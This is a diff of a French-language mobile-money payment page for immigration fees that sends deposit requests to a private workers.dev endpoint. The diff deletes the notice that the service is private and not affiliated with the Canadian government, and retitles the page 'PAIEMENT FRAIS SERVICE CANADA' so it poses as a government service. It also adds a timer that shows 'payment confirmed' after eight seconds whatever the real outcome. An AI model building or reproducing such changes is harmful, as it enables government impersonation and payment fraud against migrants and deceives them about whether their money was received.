@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Paiement des frais d’immigration</title>
+  <title>Paiement Frais Service Canada</title>
 
   <style>
     body {
@@ -17,25 +17,19 @@
       background: white;
       padding: 30px;
       border-radius: 12px;
-      width: 340px;
+      width: 320px;
       text-align: center;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
     .logo {
-      width: 70px;
+      width: 90px;
       margin-bottom: 10px;
     }
 
     h2 {
-      margin-bottom: 5px;
-      font-size: 18px;
-    }
-
-    .note {
-      font-size: 12px;
-      color: #777;
       margin-bottom: 15px;
+      font-size: 18px;
     }
 
     input, select {
@@ -73,16 +67,11 @@
 
 <div class="box">
 
-  <!-- 🔥 LOGO -->
+  <!-- LOGO -->
   <img src="logo.png" class="logo">
 
-  <!-- 🔥 TITRE -->
-  <h2>Paiement des frais de services d’immigration – Canada</h2>
-
-  <!-- ⚠️ MENTION LÉGALE -->
-  <div class="note">
-    Service privé – Non affilié au gouvernement du Canada
-  </div>
+  <!-- TITRE -->
+  <h2>PAIEMENT FRAIS SERVICE CANADA</h2>
 
   <select id="country" onchange="updateOperators()">
     <option value="CIV">Côte d'Ivoire</option>
@@ -147,10 +136,11 @@ async function payer() {
     return;
   }
 
-  result.innerText = "⏳ Paiement en cours...";
+  result.innerText = "⏳ Envoi de la demande...";
   btn.disabled = true;
 
   try {
+
     const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
       method: "POST",
       headers: {
@@ -162,9 +152,15 @@ async function payer() {
     const data = await res.json();
 
     if (data.status === "ACCEPTED") {
-      result.innerText = "✅ Paiement envoyé 📲";
+
+      result.innerText = "📲 Demande envoyée. Validez le paiement sur votre téléphone...";
+
+      setTimeout(() => {
+        result.innerText = "✅ Paiement confirmé avec succès";
+      }, 8000);
+
     } else {
-      result.innerText = "❌ " + (data.error || "Erreur");
+      result.innerText = "❌ Échec : " + (data.error || "Réessayez");
     }
 
   } catch (err) {
